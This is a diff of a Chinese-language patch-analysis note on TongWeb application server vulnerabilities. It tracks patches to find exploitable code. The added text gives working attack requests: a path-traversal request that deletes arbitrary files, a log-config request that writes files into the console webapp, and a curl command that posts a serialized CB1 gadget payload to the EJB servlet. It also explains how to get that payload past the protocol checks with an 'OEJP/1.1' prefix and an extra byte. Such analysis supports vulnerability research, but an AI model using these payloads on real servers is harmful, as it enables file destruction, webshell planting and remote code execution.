@@ -400,8 +400,17 @@ curl -X POST "http://172.16.165.146:9060/sysweb/rjcs"  --data-binary @test2.txt 
 
 官方补丁链接：http://www.tongtech.com/api/sys/stl/actions/download?siteId=1&channelId=103&contentId=1869&fileUrl=xnKfUxgX5AnAHragMhPos0QDqEthxvBOO0slash0kp7T3K6T0slash0pfE0add09ly0slash0OV9ullB0slash0esT9Y0secret0
 
+补丁位置：`com.tongweb.agent.com.FileTransferUtil#sendFile/receiveFile`，根据方法名也可以推测，sendFile文件上传漏洞，receiveFile文件下载漏洞
 
-补丁位置：`com.tongweb.agent.com.FileTransferUtil`，待解决，缺少此文件上传/下载漏洞的POC
+查找receiveFile相关调用
+```
+com.tongweb.console.log.controller.LogShowController#downloadLog
+com.tongweb.console.monitor.controller.SnapshotController#downloadSnaToMas
+```
+sendFile无法查询到，但是它上层是被AgentUtil.copyFile调用的，查找copyFile被调用的地方
+```
+com.tongweb.console.monitor.controller.SnapshotController#uploadResult
+```
 
 
 ### 补丁4
@@ -555,6 +564,7 @@ if (genericPrincipal == null) {
 ```
 
 **（3）命令执行漏洞**
+位于补丁_006，`com/tongweb/server/ExternalOptions`，类似补丁4中的命令执行
 
 **（4）console存在命令行执行漏洞**
 
@@ -608,38 +618,180 @@ curl -X POST "http://ip:9060/console/service" --data-binary @test2.txt -H "Conte
 ```
 
 **（5）修复任意文件删除漏洞**
+位于补丁_007，`applications/console/WEB-INF/classes/com/tongweb/console/commons/ConsoleFilter.class`,原本`ConsoleFilter.doFilter()`只是一行简单的链式调用
+```
+chain.doFilter(request, response);
+```
+打过补丁之后，`ConsoleFilter.doFilter()`如下，`/monitor/snapshots/delete`是明显的与删除有关的路由
+```java
+public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+    boolean illegal = false;
+    HttpServletRequest req = (HttpServletRequest)request;
+    HttpSession session = req.getSession();
 
+    try {
+        String url = req.getRequestURI();
+        if (url.contains("/monitor/snapshots/delete")) {
+	    Enumeration pNames = request.getParameterNames();
+
+	    while(true) {
+	        List beannames;
+	        do {
+		    String name;
+		    do {
+    		        if (!pNames.hasMoreElements()) {
+			    return;
+		        }
+
+		        name = (String)pNames.nextElement();
+		    } while(!name.equals("snapshotnames"));
+
+		    String nameString = request.getParameter(name);
+		    String[] beans = nameString.split(",");
+		    beannames = Arrays.asList(beans);
+	        } while(beannames.size() == 1 && "".equals(beannames.get(0)));
+
+	        Iterator i$ = beannames.iterator();
+
+	        while(i$.hasNext()) {
+		    String beanname = (String)i$.next();
+		    if (!beanname.equals("")) {
+		        if (beanname.contains("../")) {
+			    illegal = true;
+		        }
+
+		        try {
+			    fileFormatter.parse(beanname);}
+		        ...
+}
+```
+搜索`/monitor/snapshots/delete`所在位置，位于`com.tongweb.console.monitor.controller.SnapshotController`类的deleteSnapshot方法
+```java
+@Controller
+@Path("/rest/monitor/snapshots")
+public class SnapshotController extends BaseController {
+    @POST
+    @Path("delete")
+    @Produces({"application/json"})
+    public ResultInfo deleteSnapshot() {
+        ResultInfo result = null;
+        String nameString = this.getStringParameterMap("snapshotnames");
+        String[] beannames = nameString.split(",");
+        result = this.service.deleteSnapshotBeans(Arrays.asList(beannames));
+        return result;
+    }
+}
+```
+snapshots的根目录是`C:\TongWeb6.1\snapshot`，根据想要删除的文件，可以跨目录拼接
+
+发送数据包的payload如下
+```
+POST /console/rest/monitor/snapshots/delete?snapshotnames=../applications/console/aa.jsp
+```
 
 **（6）访问日志-任意文件写入&路径穿越漏洞**
 	
-com.tongweb.console.log.controller.LogShowController_补丁003
+定位补丁_003，com.tongweb.console.log.controller.LogShowController
+```
+POST /console/rest/log/setServerLogConfig?serverlogDir=applications/console/&rotationFileCount=1
+```
 
-/console/rest/log/setServerLogConfig
+定位补丁_001。`com.tongweb.console.webcontainer.controller.AccessLogController#update`
 
-../applications/console/aa.jsp
-
-位于补丁_001。`com.tongweb.console.webcontainer.controller.AccessLogController#update`
-
-/console/rest/webconfig/accesslog/put
-
-
-
+```
+POST /console/rest/webconfig/accesslog/put
+```
 
 **（7）spring、CommonsCollections、XStream漏洞**
 
 xmlpull、CommonsCollections、XStream组件升级_补丁008、补丁009
 
 **（8）EJB远程调用反序列化漏洞**
+
+位于补丁_002
 ```
 com.tongweb.tongejb.server.httpd.ServerServlet
 com/tongweb/tongejb/core/ivm/EjbObjectInputStream.class_补丁002
 com/tongweb/tongejb/client/EjbObjectInputStream.class
 ```
-需要注意的是，这个类本身在web.xml中默认是被注释掉的，也就是无法访问的。需要手动开启
+需要注意的是，这个类本身在web.xml中默认是被注释掉的，也就是无法访问的。需要手动开启。
+```xml
+    <servlet>
+        <servlet-name>ServerServlet</servlet-name>
+        <servlet-class>com.tongweb.tongejb.server.httpd.ServerServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>ServerServlet</servlet-name>
+        <url-pattern>/ejb/*</url-pattern>
+    </servlet-mapping>
+```
+并且在console目录下，需要登陆权限，所以发包时需要加入cookie，这个反序列化的数据包和之前生成的新CB1有一些不同，主要看一下调用代码中存在的一个问题
 ```	
-curl -X POST "http://ip:9060/console/ejb/" --data-binary @test2.txt
+curl -X POST "http://ip:9060/console/ejb/" --data-binary @test2.txt -H "Content-type: application/octet-stream" -H "Cookie: xxx" 
+```
+ServerServlet是请求的入口，其service方法调用了`EjbServer.service()`，继续跟进调用的是`EjbDaemon.service()`，代码如下
+```java
+public void service(InputStream in, OutputStream out) throws IOException {
+    ProtocolMetaData protocolMetaData = new ProtocolMetaData();
+    ObjectInputStream ois = null;
+    ObjectOutputStream oos = null;
+    RequestType requestType = null;
+    byte requestTypeByte = RequestType.NOP_REQUEST.getCode();
+
+    try {
+        String msg;
+        try {
+            protocolMetaData.readExternal(in); // (1)
+            PROTOCOL_VERSION.writeExternal(out);
+            ois = new EjbObjectInputStream(in);
+            oos = new ObjectOutputStream(out);
+            ServerMetaData serverMetaData = new ServerMetaData();
+            serverMetaData.readExternal(ois); // (2) 这个ois是ObjectInputStream类型的，符合反序列化
+            ClientObjectFactory.serverMetaData.set(serverMetaData);
+            requestTypeByte = (byte)ois.read();
+            requestType = RequestType.valueOf(requestTypeByte);
+	}...
+}   
+```
+当发送之前漏洞用的改造后的CB1链条数据包，会在代码(1)处报错`Unable to read protocol version`，跟进ProtocolMetaData.readExternal()
+```java
+public void readExternal(InputStream in) throws IOException {
+    byte[] spec = new byte[8];
+
+    for(int i = 0; i < spec.length; ++i) {
+        spec[i] = (byte)in.read();
+        if (spec[i] == -1) {
+            throw new EOFException("Unable to read protocol version.  Reached the end of the stream.");
+        }
+    }
+
+    this.init(new String(spec, "UTF-8"));
+}
+```
+这部分先读了八位字符，作为protocol version，查看跟进ProtocolMetaData类的init方法，发现有如下定义，也就是protocol version的八位形如`OEJP/1.1`
+```
+assert spec.matches("^OEJP/[0-9]\\.[0-9]$") : "Protocol version spec must follow format [ \"OEJB\" \"/\" 1*DIGIT \".\" 1*DIGIT ]";
+```
+还有个知识点，`in.read()`读取数据时，是不回退的，也就是读完八位，下一次再read时，会直接从八位后面获取数据。另外，还需要注意，readExternal只是单纯读取数据流，而没有做反序列化处理，所以这个protocol version的八位不应该写入序列化数据流中，直接放入请求中即可。
+				   
+但是在CB1数据流前加入`OEJP/1.1`，走到反序列化时还是不成功的，问题在于代码(2)处，这个in类型虽然是ObjectInputStream类型的，但在readObject()处理之前，先用`in.readByte()`读取了一位字符，这样构造的反序列化都会被打乱。所以需要在序列化时填入一位字符
+```java
+    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
+        byte version = in.readByte();
+        this.locations = (URI[])((URI[])in.readObject());
+        this.location = this.locations[0];
+    }
+```
+这样在生成CB1时的代码如下
+```
+ObjectOutputStream oos = new ObjectOutputStream(barr);
+oos.writeByte(1); //先写入一位字符
+oos.writeObject(queue);
 ```
 
-com/tongweb/server/ExternalOptions_补丁006
+				   
 
-applications/console/WEB-INF/classes/com/tongweb/console/commons/ConsoleFilter.class_补丁007
+
+
+
+
